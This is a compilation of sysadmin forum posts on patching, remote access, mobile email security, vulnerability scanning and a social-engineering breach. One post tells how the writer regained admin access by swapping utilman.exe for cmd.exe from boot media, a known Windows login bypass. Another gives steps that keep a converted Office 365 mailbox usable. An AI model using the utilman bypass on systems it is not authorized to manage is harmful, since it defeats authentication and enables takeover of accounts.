2003 - [KB968730](URL * Enable support for AES128/256 cipher suites - [Hotfix 948963](URL (Note - there are [added steps](URL to disable weak ciphers that you should do as a security step, but aren't part of this guide.) * Latest Windows Update Agent for 2003 - [KB946928](URL * Digest Authentication fixes - [Hotfix 977073](URL Additional items that may be relevant, depending on your environment (E.g. hardened environments): * LSA Extended Protection - [KB968389](URL - Note that may need to manually reinstall [KB975467](URL Once all of these prerequisites are done, you can either enroll your server in the SCCM Client Identity certificate you've configured, or just deploy if you're not using SSL. From there, you've got a fully functioning SCCM client! # Server 2003 Patches - Sneaky Peaky Like If you bother looking through SCCM for these KB numbers, you're going to be looking for a while; Microsoft isn't pushing them via the Windows Update servers. This may lead people to think they need to manually create the applications and invoke the patch via WUSA - not so! **There actually is catalog information available and these updates are in the [update catalog](URL ## DO NOT TAKE THESE INSTRUCTIONS AS PERMISSION TO MUCK ABOUT THE WSUS CONSOLE. ## DO NOT TAKE THESE INSTRUCTIONS AS PERMISSION TO MUCK ABOUT THE WSUS CONSOLE. ## DO NOT TAKE THESE INSTRUCTIONS AS PERMISSION TO MUCK ABOUT THE WSUS CONSOLE. Now that that's been stated. Repeatedly. I must emphasize: **This activity is extremely [narrowly supported by Microsoft](URL Do not use the WSUS console for unsupported activities. Keep your arms and legs inside the ride at all times.** To get these into SCCM, first you need to go ahead and access the WSUS console on your Software Update Point. Via the context menu or action pane, select the [""Import Updates"" button](URL Click it, and you'll be directed to the [Microsoft Update Catalog website](URL from there punch in each of the updates we need to import: * KB3197835 * KB4012583 * KB4012598 * KB4018466 * KB4022747 * KB4024323 * KB4024402 * KB4025218 And click ""Add"" for the relevant products you need. Once you're good to go, [select ""View Basket""](URL in the upper right corner, and [click ""Import""!](URL The site will begin syncing your [updates into WSUS.](URL Once they're all [nice and done](URL initiate a synchronization [within SCCM](URL Now, obviously, the rules you've configured within SCCM must permit these items - if you're not synchronizing Server 2003 as a product, you won't see these updates even after a synchronization. You can check the typical log files if you've got issues (e.g. wsyncmgr.log). Remember, if you're impatient, once you start the Sync you can recycle the SMS_WSUS_SYNC_MANAGER process to make it kick off immediately. :) Once the sync is done, they should show up in the [SCCM console](URL Download them and [add them to a SUG](URL to deploy! Happy patching, folks! # Doing it without SCCM? If you just have WSUS, I still recommend the 2003 patches, as they'll greatly improve your security posture. But the bottom line is that once these updates are in WSUS, you can treat them like any other WSUS patch and approve them accordingly. SCCM manages approvals and such if you're using it, which is why I emphasize not to muck around, but if you're using only WSUS, that's all ya need to do to import any catalog update. :) "

I think I read somewhere that 90% of hacks start via email. But, typically the worst we see via email is credential harvesting. In such cases, we just have the user change their password.

It seems it's more of ""I always heard VPN is more secure, I always heard RDP is super insecure, and therefore I think you're an idiot for not using VPN."" But let's look at the facts: * RDP in its current form, utilizes secure encryption, enforceable by policy, so sending unencrypted data isn't a concern anymore. * RDP's biggest risk is passwords being brute forced. This is severely mitigated by a good password policy and some type of brute force prevention system on the terminal server. * RDP is relatively mature, has years and years of development, bug testing, etc. Is it possible new vulnerabilities will be discovered? Sure. Does the same apply to IPSec? Sure. * For additional layers, a RD Gateway server can be deployed giving you a HTTPS front-end, additional security layers, giving you SSL-RDP-SSL-RDP system. Attackers have to make it through first SSL layer before they can expose a RDP vulnerability. * You can utilize 2FA systems on both a VPN and a RDP environment to add additional security layers to either. Now, I'll start by saying I always recommend VPN-only as the first/best solution for remote access for my clients. But many of them don't like it, don't want it, etc. So we end up giving them a public facing terminal server. But I would never want to say that in a thread, because I'll instantly get slammed by all the RDP-naysayers telling me how insanely insecure and lazy it is. Well, I would like to know from some of you, some *details* as to *why* you feel the need to say how insanely insecure and lazy a public facing RDP connection is. Now, if your reasoning consists of: * It adds an additional attack vector - obviously this is an accurate statement. It's an additional attack vector, you have to make sure the system is properly monitored, logged, and kept up-to-date, etc. It completely make sense to use VPN-only so you can limit yourself to a single vector. * RDP is completely insecure - OK, examples please? Yes I'm aware that every once in a while a vulnerability in RDP is discovered, but the same applies to IPSec, or ANY other protocol out there. In other words, shit happens. But does that justify it being called ""completely insecure""? Again, as I said earlier, I do strongly believe VPN is the best form of remote access out there, and I do recommend it as such. But I'm getting a little annoyed with the ""OMG terminal server is so insecure"" hype, when if setup properly, it can be a very secure platform for remote access, so much so that a public-facing RDP environment that utilizes proper security is considered 100% HIPAA compliant, and you have companies such as Amazon and Microsoft betting a huge market of their hosting environment on the security of the RDP protocol for remote access. I would love to hear any legitimate reasoning as to why it's not that isn't just hype. "

Im not an expert, so please excuse any ignorance; Im just trying to learn and approach this correctly. Sorry if this is super long. We are using BES to containerize and secure email on mobile devices (Android and BB10 devices only, so far). BES works as designed, keeping contacts and email separate from the rest of the phone. An issue we've run into on Android is, I guess, user experience. Contacts don't show up in the the personal side, e.g. phone or messaging apps, unless you specifically search for a contact. This is by design and/or restricted by Android security, but it causes headaches in device setup and usability. Our current workaround is to add a second ActiveSync account to the device on the personal side, syncing only contacts. Am I correct in assuming that this isn't actually very secure? If a device is compromised and wiped using BES, the AS account will still be on there. If someone was able to access the phone, they could just go into the account and re-enable email sync. Even though AS has a remote wipe feature, what if the device loses connection to the Exchange server via AS? Does the email get wiped after a certain time? Or, if it loses connection, is the email on the device forever? BES has a wipe feature if it loses contact after X amount of days. My manager is skeptical of AS because he believes it not to be secure, in that its so common that it may be the first or easiest protocol breached in an attack. Is this correct or does he have outdated information? AS is encrypted using SSL, isnt it? The other concern with AS is the containerization. If I have just an AS connection on a phone, whats stopping a rogue app or an operating system vulnerability, or something like that, from accessing the data in the email app? The BES email connection uses AS but its containerized. I guess Im posting this to get some more information on ActiveSync and its security implications. Im also wondering if theres a better way to sync contacts on mobile devices. A slightly related side note: Almost every post that shows up here by searching for BES is celebrating getting rid of it. Is BES really that bad or was it bad just in the past? BES12 seems to work fine for us."

According to Cloudflares security team, the greatest period of impact was from February 13 and February 18 with around 1 in every 3,300,000 HTTP requests through Cloudflare potentially resulting in memory leakage. While Cloudflare patched the discovered issue quickly, it was possible sensitive data was leaked to third party search engines that cache data such as Google.com. &gt;Cloudflare has worked with the security team from Google to search cached data for any relevant Vultr links and has confirmed no data was found. Based on this we have no reason to believe any Vultr customer information has been compromised via this Cloudflare bug. &gt;This is a good opportunity to remind you of best security practices to secure your account: &gt;* Enable 2 factor authentication for your main vultr.com account login. * Change your control panel password every 90 days (or less). * Always change your Instances default password after initial deploy. * If you utilize the API service, ensure your API IP ACLs are configured correctly. * Routinely scan your computer for malware, spyware, browser extensions, and Virii that could compromise or leak private information. &gt;We will continue to closely monitor the situation and stay in close contact with Cloudflare should there be any change in the facts we have received thus far.

By default, CDOT 8.3.2P5 sets these SMB settings to ""system-default""; the default behavior is to enable SMB v1, and disable SMB v2. A recent (i.e., February 2017) security guidance provided by Nessus recommended disabling SMB v1 on all Windows endpoints, including domain controllers. By disabling this, we managed to disable NetApp domain authentication and CIFS services. Finding the commands for this was thanks to a similar bug located here: URL To re-enable the functionality, use the following steps: *SSH in to the storage cluster, using the admin breakglass account if necessary. *View the current CIFS security settings using the vserver cifs security show command. &gt;An example of such a command is vserver cifs security show -fields smb1-enabled-for-dc-connections,smb2-enabled-for-dc-connections,is-signing-required &gt;The output will show the current settings for all vservers. *If SMB1 and SMB2 are set to ""system-default,"" these settings will need to be changed.

Day after day I see other members of the IT team busting their asses trying to keep the ship afloat and I just sort of sit around, tinkering with things that no one really cares about. Am I stupid for thinking that having an actual manager/superior would be beneficial? Most people I've spoken to envy my laxed work days and the fact that I technically have no one to report to on a day to day basis. However, I have been out to learn from the beginning and truly would benefit from some sort of mentor that knows their shit whit information security practices."

740,vulnerability,sysadmin,Office 365 Security Bug identified - Microsoft doesn't agree.,3,5l5c7i,https://www.reddit.com/r/sysadmin/comments/5l5c7i/office_365_security_bug_identified_microsoft/,2016-12-31 06:38:55,"Submitted this bug report to the Microsoft Security Response Center hoping that Microsoft would make good on their bounty program and pay me, however they don't feel this meets the definition of security vulnerability. Since admins have the expectation that once a mailbox is converted to shared it can no longer be logged into directly I'd say this is clearly a security vulnerability. The bug identified presents both a security risk to Office 365 tenant organization as well as an extraordinarily simple method for tenant organizations to create Exchange Online accounts for free. Basically, after an account is created in Office365, the mailbox is converted to a shared mailbox and license is removed from the Office 365 user, the user is still able to log directly into the mailbox via Outlook, Outlook Mobile App, Outlook Web App. My understanding is that a shared mailbox is never able to be logged into directly using a username and password, (fundamental feature, or lack thereof), this presents a problem. I have proven this process under tenants that are using AADSync, AADSync+Federation, Cloud Only. Each were completely different tenants, one was a vanilla tenant setup for the sole purpose of this test. Detailed steps to reproduce: 1. Create Office 365 account in the Office Admin Center with any license assigned to it that has an exchange included and wait for it to be setup. 2. Go to EAC &gt; Mailboxes &gt; convert the mailbox for the user that was just created to a Shared Mailbox 3. Go to the Office Admin Center, Unlicense the account that was just converted into a Shared Mailbox -- Even though the mailbox is now a shared mailbox and the Office 365 user is unlicensed you are still able to log directly into the mailbox and use it like any other licensed mailbox. You are even able to reset the password for the Office 365 user and continue to log into the mailbox using the new password. -- Portal.office365.com will not show any available apps (tiles) since it is unlicensed, but direct access to mail.office365.com still succeeds -- I have waited as long as over a month after unlicensing the account and the shared mailbox was still able to be accessed directly using a username/password. A user told me a month after it was converted that they were still able to log into it. That is how it was discovered. Microsoft's response: Thank you for contacting the Microsoft Security Response Center (MSRC). Upon investigation we have determined that this does not meet the bar for security servicing as it is not a security vulnerability.

If I set &lt;action permission=""run"" version=""SECURE-1.6"" /&gt; (or whatever the correct syntax is; not worried about that right now) for a specific URL in the DeploymentRuleSet.jar, does a user that wants to access that URL and run JRE 6 actually NEED JRE 6 installed on their machine? Or will 8 u111 see that exception and do some sort of emulation? **Longer, rambling post:** Hi guys. We currently are attempting to move our organization to Java 8u111. The deployment is fine, and the deploymentruleset.jar is signed and working fine. Here's my question: we're getting pushback from security to REMOVE Java 6/7 versions from machines that use these old JREs for legacy apps. That's understandable, and that's what we're trying to do. Now, I've read that with the Deployment Rule Set, I can specify WHICH version of JRE to run for a specific site. So, let's say there's a legacy web app that requires JRE 6 located here: URL Now, this is easy to allow with the Deployment Rule Set. So, is JRE 8 u111 actually going to EMULATE JRE 6 to run this app? If so, we would have that legacy compatibility, and still be able to remove JRE 6 from the machine. Or does this work the way I think it does, in that, we KEEP the required legacy JRE 6 on the machine, but the Deployment Rule Set blocks that from running by forcing JRE 8 u111 to run all possible web apps, BUT ALLOWS JRE 6 to run for the one exception I've set in the Deployment Rule Set for URL If the latter is the case, then JRE 6 would technically be secure on the machines that need it, in the sense that no web apps can use it, EXCEPT when specified in the Deployment Rule Set, correct? The main issue is our security team sees JRE 6 on the machine, which is assigned an arbitrary vulnerability score, and we get hit for that. So, even if we lock it down to one or two URLs only, and the rest run with JRE 8 u111, we can't remove it, right? I'm assuming the ""emulation"" part is just a myth? "

Whenever anybody mentions Windows XP and why it's a Very Bad Idea^tm to continue using it, the first thing anyone says is that it is ""insecure"". That blog post is a good example. The ""insecure"" Windows XP operating system. Shame on NHS! Using such an insecure OS is a terrible risk to patient data! But... is XP actually insecure? It's obsolete, sure. I get why companies should be moving away from XP. But the biggest issue IMHO is that there is no longer any reasonable expectation of interoperability with other platforms or systems. If you keep using it you're setting yourself to get bitten in the ass because at some point you will discover a problem that you can't solve without moving away from it. Latest version of Office, Google Chrome, and countless other programs do not run on XP, and many other products simply aren't tested for XP anymore. Advancements in new operating systems are undeniable, and you're simply using old technology if you're using Windows XP. So I agree that Windows XP is obsolete. But *insecure*? Why is it insecure? On April 7th 2014 it was considered a perfectly good, secure, wonderful operating system. Just because Microsoft isn't releasing security patches for the operating system anymore, does that immediately mean the operating system has leprosy and all your precious files and data will magically leak out of it's ass directly into some nefarious hacker's lap? I mean by that logic, ALL operating systems are insecure. You think Windows 7 is secure because it's still supported by Microsoft? What about all those future Security Patches that Microsoft hasn't made yet that haven't been installed on your operating system yet because they don't exist? Windows 7 is horribly vulnerable and insecure to all of THOSE security bugs. Isn't it? Isn't that no different than the fear of the as-of-yet-undiscovered security vulnerabilities in XP? I mean granted, with Microsoft not making any security patches for XP anymore, maybe at some point down the road someone will actually discover a serious security vulnerability in XP. If and when they do, Microsoft won't fix it. But IMHO *only then can you call XP insecure*. So... has this actually happened yet? Are there any real vulnerabilities worth mentioning in WinXP that are not going to be fixed? Is there actually a good security reason not to use it besides fear-mongering? Food for thought, I suppose. "

Right now, I'm considering putting the folders I want into encrypted .7z files with long passwords stored in a Keepass file. The files need to be compressed anyway, so unless there's a vulnerability or inherent weakness in 7zip's encryption, this seems the obvious choice to a layman such as myself. Backblaze offers an alternative way to encrypt files with OpenSSL that in essence seems to be similar to my above method. I don't know enough about OpenSSL vs. 7zip encryption to distinguish them on security grounds, but the 7zip method seems less complex, and something someone who isn't super technical could do (It may be that someone less technically savvy than myself will need to access them in the future). I know there are also a number of other options out there as well, and I'm open to any of those. I'm not a real security professional, so let me know if my idea seem moronic. I've considered putting the files onto an external HDD instead, but I'd still need to encrypt it, and I feel like it could get lost more easily.

I work as an intern for an ISP and they are looking to implement patch management. Specifically the detection of older patches, so it's intertwined with vulnerability management. We do not want automatic patching and an allround monitoring system is already in place. I have been looking at tools like Nessus, GFI languard, Nexpose and a solarwinds solution. These tools work fine with windows, linux and some cisco appliances. The tricky part is that it also needs to scan more specific appliances like infoblox systems. Does anyone know if this is possible, or will we have to start coding outselves to recieve info from these systems? The goal of the solution is to produce reports so management knows what systems might be a liability. This might be hard if we start coding ourselves. Sorry for my bad english it's not my native language."

We currently work with a 3rd party that does a number of things for us including but not limited to: * Anti-Virus scanning and remediation (24/7 scanning and remote support when any malware, malicious links appear on a users' machine) * MVA reports - Managed Vulnerability Assessment reports every 2 weeks. This is what we're looking to bring in house. I've been quoted a price and can't quite believe it's what we're paying for this to happen (roughly $25K -- this could be exaggerated). They automatically generate an excel sheet with various vulnerabilities across all of our servers/workstations. Things like SSL problems, certificates expiring, critical patches missing from a server, the list goes on. * WAF - This is another thing I've been tasked with looking for. I have zero experience with our current solution so I'm not really sure what questions I need to be answering The biggest thing I need to find right now is something that provides these vulnerability assessment reports. What is out there now? It looks like they have an appliance inside our network (QualysGuard Virtual Security Appliance) that I can only assume does all of this network security scanning. I've done some searching and have found a few things here and there but nothing that quite fits the bill. Given my complete lack of experience in this field, I'm turning to the reddit community in hopes of finding some direction on what makes the most sense in our environment. Here's a high-level view of our current infrastructure: * ~100 VMs * 5 remote offices (less than 30 users at each location) * Main office has about 450 workstations (desktops &amp; laptops combined) * SonicWALL firewalls at each location * Anywhere from 50-75 remote users on laptops We're mainly interested in monitoring the integrity of the main office. Any issues from informational to critical all need to be captured as that's what we're currently able to see. I can try to provide a sample of the current report shortly. Thanks in advance. Hope I've provided enough information to at least get a start!"

I'm fairly ignorant when it comes to the vulnerability of having open ports, but I'm also fairly certain that having 10+ open ports on a DC is probably not alright. For example, how can I determine what ports are acceptable to keep open? I've been using speedguide.net/ports.php but it seems like most open ports have some sort of vulnerability.

I work for an MSP, it's my first job in IT and i've been in it just over a year now so of course i'm not without my faults which i learn from pretty quick if i say so myself. We provide support for a company of 20 users, some remote, some not, some on laptops, some dickheads, some on desktops. We have a remote client which allows us to login to their PC anytime of course and as they're not on a domain we create a local admin account with administrative privileges (Remember this, it's important for later). Now let me introduce you to Andy (Not his real name), now Andy is a middle-aged man who has the patience of a an american cop with a gun but he has less communication skills than that unless he's making a sale... so of course my continuous emails to attempt to do anything to his PC are met with less response than a dead raccoon, the first day we met he was almost angry that i wanted to put monitoring software on his PC to assist him should he need it. He's also one of those lovely gentlemen who expect me to know exactly how long everything will take. Fast forward to today i get a call from ""Andy"" Me: FatPotatoNinja Speaking Andy: I forgot my password and can't login Me: Alright i'll login now and reset it for you .... .... *internally* oh shit At this point, i knew, i fucked up. I realized the god damn mother trucking sun of a gun admin account was a standard shitting user. I don't understand why he changed his password and had forgotten it but most of all i don't remember not making this account an admin... i always make them an admin! My boss is on holiday but told me to call him if i needed anything so i did... luckily he had a program which was supposed to wipe passwords but i couldn't even get it working on my own spare laptop so decided to shit in my hands and clap at myself whilst working out what is the easiest way to rectify my lil fuckup and i didn't know a single way other than getting an install disk/USB and resetting it that way, it took too long to come to that decision but at least i got to the decision. So i proceed by sending them the required files and tell me to stick that badboy on any empt usb and await further instructions. So the time came around, Andy wasn't free and neither one the one technical guy on their site so i was on the phone with a wonderful woman called ""Not Andy"" (of course not her real name) So i instructed Not Andy through the process of opening cmd prompt to move and copy cmd.exe to utilman.exe and it was all working wonderfully! Great! Just like it did when i tested on my laptop! Until it rebooted...with updates...oh god why it's something different it's broken i know it's fukin broken it god freakin damn the ease of access center doesn't open the cmd prompt ughhhhhhhhhhh fine common Not Andy we'll go do it again! so off we skip to repeat the process... 'The file destination cannot be found' oh for shit sake. Off i dally for some time trying to narrow down what the heck to do when i have a genius solution! There's multiple drive letters... yes, Yes there is! So i do the standard google search to find ""wmic Logicaldisk get Name"" and bam! more drives! test on my laptop is my first thought! E:\ works! woo! fixed!! So i go back on the phone with more hope in my voice than the past 4 hours, run Not Andy through the new commands to run and yippee! it works! i've not been more excited since probably two weeks ago! amazing! I create a new admin account and have full control again! I know i pretty much caused this myself and you may think I'm shit at IT and i'd agree but then i'm also great at IT because i fixed something i broke and i worked it out all on my larry! (clearly not the first time that's happened...) I'm just glad i used my own brain and came up with a solution all by myself! On a side note... why is there such a gigantic vulnerability such as this? i know you can disable cd/usb boot but without a bios password can it not just be changed straight back?"

I decided to remedy this and after I was done I was chewed out because it is a ""huge security risk"" to have a system in the DMZ, that authenticates to a RODC in the DMZ, be part of the Domain. I am aware of the Golden Ticket exploit and have a background in security, however I am not sure the rationale behind this at all. These systems can phone back into the LAN anyways via SMB shares..which to me are a huge vulnerability. On top of this, they are referring to them as ""Windows appliances""....they are full server installs of Windows...they are not stripped down in any way. Not sure why we have not begun using a squid proxy, I have been pushing for this for the past 6 months to no avail because ""you don't know anything about security!"".

I've about hit my wits' end trying to figure out whether these are false positives or something I need to look a lot closer at. Our Windows 10 machines are reporting 20+ ""low security vulnerabilities"", all related to Microsoft Security (MS16) bulletins and given Oval/CVE headings. A Windows Update KB for each of the MS16s referenced can be found in one of the monthly Windows 10 cumulative updates (CU). Microsoft states that each monthly CU includes the fixes from each previous CU. When a CU is applied, it appears in Windows Update under its own KB heading, and does not list the various patches rolled into it. After several months of applying the most recent CUs, the vulnerabilities still appear in LanGuard. Example: One vulnerability refers to MS16-047. The fix for this vulnerability is Windows Update KB 3148527. For Windows 10 version 1511, this was included in the April 2016 CU (KB 3147458). The computer in question has the CU from July 2016 (KB 3172985). In theory, this vulnerability should be patched. Yet the vulnerability appears when the computer is scanned. This example is one of around 20 that follow a similar pattern. My question is twofold: 1) When scanning for these vulnerabilities, is LanGuard simply checking for the presence of a vulnerability-specific KB, or is it actually looking into the code for whatever setting/entry needs to be changed? 2) If it's only looking for a vulnerability-specific KB, and is not looking for the CUs, is there a way to verify that the vulnerability has been taken care of? None of the KBs for these vulnerabilities have a registry key for verification."

Ensure that logging on endpoints are enabled. I set a Windows GPO on the DC to force event logging and auditing. Pushed the GPO and double checked to make sure that the service was enabled. Obviously, by default it is enabled, but the GPO *should* ensure compliance. We have a log analytics tool that maps the users to the events for the accountability. I failed my security audit. They were more than happy with our choice in log analytics tool to meet the requirement of the control, but not the logging service monitoring aspect. When I questioned the auditors, they flat out told me that just because it is enforced does not mean that the service is actually running. The examples they gave me: 1. The logging service crashed and has not restarted. How would you know that it not working. 2. Malicious hacker uses a vulnerability in the logging service, uses a buffer overflow attack to crash the service, wipes the local logs and does terrible things. How would you know that the service was not running during that time. Basically, this is a paradox. How can the logging service log that it is not working. I was also told that if even one endpoint was not logging I am out of compliance until it is fixed because it fails the control. Naturally the answer would be to use a remote service manager that polls remote endpoints for the status of the logging service being up or down and report/alert when that condition is met. My understanding of Windows remote management requires either MS products that cost money, scripts to do checks via Powershell/WMI/other or a 3rd party product. How do you guys do it today?"

MS16-072 is an important update that targets Group Policy and security filtering. This means that to avoid a man in the middle attack (MTM) the product groups have decided to remove security filtering by users. So any GPOs you might have in place that relies on scoping GPOs to users will break if this patch is applied. Heres more additional information: MS16-072 changes the security context with which user group policies are retrieved. The intent of this by-design behavior change to protect customers computers from a security vulnerability. Prior to MS16-072, user group policies were retrieved using the users security context. After installing MS16-072, user group policies are retrieved using the machines security context. Symptoms: New and existing user group policy that has been security filtered on user accounts and / or security groups may fail to apply on domain joined computers. Cause: This issue may occur if the Group Policy Object is missing Read permissions for the Authenticated Users group -OR- This issue may occur if you are using security filtering and are missing Read permissions for the domain computers group Resolution: Using the Group Policy Management Console (GPMC.MSC) Add the Authenticated Users group with Read Permissions on the Group Policy Object (GPO) -AND / OR- If you are using security filtering, add the Domain Computers group with read permission. This particular patch can be put on hold until you have put in place the fixes outlined in this email. Afterwards, apply the patch normally. If you have further questions, let me know. TLDR; If you use GPOs that are scoped to users or groups they will break if you install this patch."

I haven't had any time to breathe in quite a while. The helpdesk calls continuously pour in, somehow our helpdesk number keeps getting flooded with robocalls and all kinds of irrelevant garbage from people who don't even work here, and that doesn't even include the frequent calls to individual desks or walk ups. We also have frequent after hours and weekend calls, which resulted in me (yes, as an intern) having to drive in at about midnight to fix things. Our users are also exceptionally bad. I had to walk to another building to help a user who called stating ""The internet is gone"" (and leaving no name or callback number on our voicemail). She had simply moved the internet explorer icon into the recycle bin. I had another user complain that his computer had crashed and wouldn't turn on. He had hit the power switch on his plug strip with his foot. These aren't even the worst things I've had to deal with. The first issue I noticed almost immediately is that we have some seriously out of date servers. When I started I noticed fairly quickly in the device listings, on top of a huge amount of servers running Windows 2003 and laptops running Windows XP, a server running Windows 2000, and another server running Windows XP, and even found one server (that fortunately isn't up very often, but does still see use) running Windows ME. We can't take any of them out because the ME and 2000 servers are needed by finance to run some ancient third party app that can read our old records that we need to keep, and the XP system is running some special app for another department that only runs on Windows XP and absolutely nothing else. Also notable is that both the XP and ME systems are desktop hardware, so they have no reliability. We also can't virtualize either of the desktop systems because both applications break in a virtual environment (the 2000 and all 2003 system is virtual). On top of that security doesn't seem to be taken very seriously. Some device on the network has been trying to log in with the domain admin account several hundred times per day, and has even locked out that account a few times per day, and yet nothing has been done to fix it or even figure out what's causing it. The full time staff say this has been going on for years now. The camera system is running on a beige box that regularly loses a feed, and that includes monitoring for our IT equipment and for all kinds of sensitive financial areas. Our vulnerability scans also regularly report hundreds of critical vulnerabilities each on several of our systems, including some internet facing systems, but I have never seen these addressed. I have seen what looks to be a fresh install of Windows Vista on one desktop, that is actually used for viewing the public internet. It fortunately doesn't appear to be infected with anything, but it is still a problem, and we for whatever reason aren't allowed to take it down because it does something after hours. Data destruction is very poor. They use a demo version, explicitly stated as ""FOR NONCOMMERCIAL TRIAL USE ONLY"", to try and clean disks before they're ewasted. I have managed to find that data can still be recovered from those disks, and even suggested alternatives, but these have been ignored. Perhaps the worst would be how customer passwords are handled. We do ecommerce (though at least the credit card data never passes through our network), and require that customer usernames are 8-10 characters and passwords are 6-8 characters. This because passwords are not actually hashed, but XORed with the username before being stored. If a customer clicks the ""forgot password"" button, we just send them an email containing their password. This system is somehow considered adequate. I also can't see much of a concern for reliability. We have a VM ""cluster"" that consists of only one very powerful host whose storage ""array"" is a SLED (luckily the data the virtual servers actually use resides in a database on a physical server. It's just the operating system files on the disk). We also have both of our core switches (which are not parallel, but serial, so if one goes half our network is out and if the other fails the entire network is down) connected to the same power, with each only having one power supply connected, so a loss of power to that source would take them both off. Most of our servers have both power supplies connected to the same power source, producing the same problem, though there are a few connected properly and a few others with only one power supply connected. As for our hardware itself, most of it doesn't have a service contract. They hold service contracts on only a few systems (I think it's one of each model), and when something fails, they swap out the bad parts for a good part on one of the systems they have a contract for, then call in a failure on that system. I have heard service techs getting suspicious about how often that one system fails, so I am worried something is going to fall apart, or that there will be more failures than there are donor parts at some point. Perhaps the most illustrative bit would be what happened Friday. About two weeks ago I was cleaning out a storage closet and found a folder containing 8 3.5"" floppy disks. I was told by the full time staff to give that to another department. About a week ago, a new system popped up on the network, and we couldn't identify the operating system on it. We thought the device was having issues, as the switch showed a connection at 10Mb, half duplex. Friday I managed to find the physical system, and it turned out to be a beige box running Windows for Workgroups that the department had installed the software from those floppies on and connected to the network. It was connected at that low speed because it didn't support 100Mb, and thus autonegotiation. I'm in charge of supporting this living fossil until my in internship ends, which isn't for quite a while. And this is on top of handling helpdesk calls and whatever other odd jobs I get from the full time staff. I honestly do not know how to even begin handling things. I know Linux and have a good understanding of virtualization, I know enough about Windows to get by, but I only know how to handle things in a modern environment, not one where dinosaurs roam the network. I currently have at least some responsibility for desktops and laptops running Windows 7, Vista, and XP, a virtual Ubuntu server running inside a virtual Windows 2008 R2 server (yes, it's chain virtualized. An intern set that up 3 years ago because the department using that server needed to be able to access it via Windows RDP, but the application only ran on Linux. Why they chose to chain virtualize it as opposed to something sensible I have no clue), and the previously mentioned Windows for Workgroups system. I have previously been asked to look through logs, including the Windows security log (and you can imagine how cluttered any log is in this environment) and look at hard drive images to see where a virus came from, and I will probably need to do so again in the future. I'm wondering if anyone has tips to get things done faster, or if there's anything I can do as an intern to lessen the workload, because there's no way I'm going to be able to keep up with this workload.

For example, I often have to run ""AD Users and Computers"" with my Domain Admin creds for a variety of reasons, so to make my life simpler, I created a simple batch script that just did a quick RUNAS like so: RUNAS /user:DOMAIN\AdminAcct mmc ""%SystemRoot%\system32\dsa.msc"" This has been working fine for years. Now, enter Windows 10. For some reason, the same script no longer works. It now throws an error that looks like so: Attempting to start mmc ""C:\Windows\system32\dsa.msc"" as user ""DOMAIN\AdminAcct"" ... RUNAS ERROR: Unable to run - mmc ""C:\Windows\system32\dsa.msc"" 740: The requested operation requires elevation. I have no idea why this is. CLEARLY my Domain Admin account has the rights it needs, but for some reason, now CMD actually needs to be elevated in order for this to work. The first thing I tried was making CMD always run as Admin with my local account (I have local admin rights on my own machine), but that didn't work. Eventually, after a lot of trial and error, I figured out that I could get CMD to run with Admin from a script by using RUNAS with my Domain Admin credentials. From there, you can pass another command to be run by the elevated CMD with the /C switch. What you wind up with is a Batch script that looks like so: RUNAS /user:DOMAIN\AdminAcct ""CMD /C START \""\"" MMC \""%SystemRoot%\system32\dsa.msc\"""" Not pretty, but it works. On the plus side, it also works in Windows 7. **EDIT:** Apparently I wasn't clear on this... The whole point of this script is to get a prompt to put in the password for the Domain Admin creds, not to use a stored credential. As others have pointed out, that would be a huge security vulnerability. Assuming you're putting your password in every time you run the script, this shouldn't be any less secure than doing a SHIFT+Right-Click &gt; ""Run as different user"" and putting in your Domain Admin creds that way. And again, you would only use this in situations where you *ABSOLUTELY* need Domain Admin rights, such as for Group Policy editor or something similar. In this case, that's Active Directory Users and Computers. "

The director of IT was not open to getting rid of the expiration altogether. Is 120 days too long? Is there some security vulnerability I'm not thinking of? 2) Is there some AD setting to let the users login (through a Gateway) even if their passwords expired to reset ti themselves? 3) If not, do you know of some way to make them all expire at the same time company wide?

Anyway, while I would never run these myself, my dad does need GUI management/ billing software because he doesn't know how to use a shell. So one of the other problems with the setup of his server is that he gives his customers FTP (I haven't confirmed it's SFTP only, but I hope so) to their own home directories, so they can manage their sites. I'm not sure whether he's using fail2ban or some type of throttling or IP blacklisting techniques. Keys would be a better alternative to passwords as well. It does seem like Wordpress is being kept up to date and I'm not sure whether or not customers can run their own Wordpress plugins. It's my intention to make sure these things I just mentioned get taken care of because they will prevent a break-in in the first place. Still though, he needs to have some defenses in place to ensure a break in to a non-privileged account doesn't lead to a root. That's where I really need suggestions. Somethings I was looking at: URL URL and URL I won't comment on them because this post is long enough, would just like to hear feedback from people with more than my next to 0 experience as a sysadmin."

After whatever solution you picked was fully installed and configured, where did you start? It would seem that Windows server Local Admin accounts would be the easiest, followed by the least ubiquitous / least critical Domain Accounts running Windows Services. Are there sysadmin tools that just won't work properly with the PAM tool acting as the middleman? Do you also start with a policy that allows the sysadmins to see certain passwords / copy to clipboard, or just bite the bullet and enforce all access to the servers with the PAM tool acting as the middleman.

Let me tell you the story about a server. I, like many of you, host servers for various activities, on various hosts. Each of these servers are secured to a standard that I would like to say is high, it least, by comparison to other servers on the web. Separation of duties, ensuring each service has it's own account. SSH access on a non-standard port using certificate based authentication. Firewalls, fail2ban, etc, etc etc. So, how do you formulate a plan to take down a host such as this? Well you can probe it all day long, maybe for weeks, scouring for that 0day application vulnerability, that will be your stepping stone into the server. But you're impatient, why take all that time? So you decided to use social engineering to your advantage. You do research on the owner of the server, name, address, phone number. All this information is fairly easy to find, and is probably the number one activity most people do when they want to attack something. This is exactly what happened to me. Now, I'm pretty careless with my information. I don't care if people know who I am, where I work, what I do for a living, and about that time I got my third testicle removed. This was careless of me. While there was no direct attribution to me from my domain, I made the mistake of originally registering it without WHOIS guard. An individual who decided they wanted access to the Ds on one of my servers decided that the direct approach would take too much time. Instead they went the roundabout way of directly contacting my web host. (For the record, this server in question is hosted on one of the Top 10 cloud providers in North America. In this case it was a VPS container running Linux in a Sapless environment with the control panel disabled.) The person called up the customer care line of the web host and successfully social engineered the customer service representative to resetting the password on the account. Now, this was a major failure in part of the web host, and internal policies were broken. I've spoken with a rep from the company, and they fully agree that procedures weren't followed. But remember, the entire security of your server is in the hands of a customer service representative who makes minimum wage, or less. Once the account password was reset, the individual was able to use the serial console to gain access into the VPS, reset the root password, and then proceed with exile of the database. All in all, this took less than 2 hours to perform. Once I noticed that I had lost access to the server, I called into the company to start triage. After reviewing the logs, the individual was smart enough to cover tracks by using an anonymous VPN. Not taking chances, the server was restored from a backup taken the day before. Obviously this lead to a lot of follow up work. Working with the web-host to determine what happened, relying on our BCP to ensure services are restored in a timely fashion, password resets galore, and the dreaded e-mail to customers informing them about the breach. This can all be avoided. If you are using a cloud based provider for any service at all, call them up and 